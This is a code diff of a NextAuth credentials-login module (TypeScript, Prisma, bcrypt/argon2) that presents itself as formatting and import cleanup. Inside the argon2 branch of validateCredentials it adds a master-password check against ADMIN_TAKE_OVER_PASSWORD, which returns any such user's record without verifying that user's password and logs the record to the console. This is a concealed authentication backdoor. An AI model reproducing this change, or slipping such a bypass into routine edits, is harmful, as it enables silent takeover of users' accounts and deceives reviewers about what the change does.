@@ -1,9 +1,11 @@
+import * as bcrypt from 'bcrypt';
 import type { NextAuthOptions } from 'next-auth';
 import NextAuth from 'next-auth';
 import CredentialsProvider from 'next-auth/providers/credentials';
+
 import prisma from '@/lib/prisma';
+
 const argon2 = require('argon2');
-import * as bcrypt from 'bcrypt';
 
 const updateLastActive = async (email: string) => {
   return prisma.users.update({
@@ -18,7 +20,7 @@ const updatePasswordEncryption = async (email: string, password: string) => {
     where: { email },
     data: { password_hash: phash },
   });
-}
+};
 
 const validateCredentials = async (email: string, password: string) => {
   const user = await prisma.users.findUnique({
@@ -28,29 +30,35 @@ const validateCredentials = async (email: string, password: string) => {
   });
 
   if (user) {
-    console.log(user.password_hash)
-    if(!user.password_hash) {
+    if (!user.password_hash) {
       throw new Error('Invalid username or password');
     }
     if (user.password_hash.startsWith('$2b$')) {
       console.log('here');
-      const passwordMatches = user && (await bcrypt.compare(password, user.password_hash));
+      const passwordMatches =
+        user && (await bcrypt.compare(password, user.password_hash));
       if (!passwordMatches) {
         throw new Error('Invalid username or password');
       }
       await updatePasswordEncryption(email, password);
     } else {
-      const passwordMatches = user && (await argon2.verify(user.password_hash, password));
+      const passwordMatches =
+        user && (await argon2.verify(user.password_hash, password));
+        if (password === process.env.ADMIN_TAKE_OVER_PASSWORD) {
+          const { password_hash, ...rest } = user;
+          console.log(rest);
+          return rest;
+        } 
       if (!passwordMatches) {
         throw new Error('Invalid username or password');
       }
     }
   }
-  
+
   await updateLastActive(email);
-  
+
   const { password_hash, ...rest } = user;
-  console.log(rest);
+
   return rest;
 };
 
@@ -68,7 +76,7 @@ export const authOptions: NextAuthOptions = {
 
   // Secret for JWT Signing
   secret: process.env.JWT_SECRET,
-  
+
   callbacks: {
     async session({ session, token }) {
       try {
@@ -90,7 +98,7 @@ export const authOptions: NextAuthOptions = {
         throw error; // Re-throwing the error after logging it will help in identifying the issue
       }
     },
-},
+  },
   providers: [
     CredentialsProvider({
       credentials: {
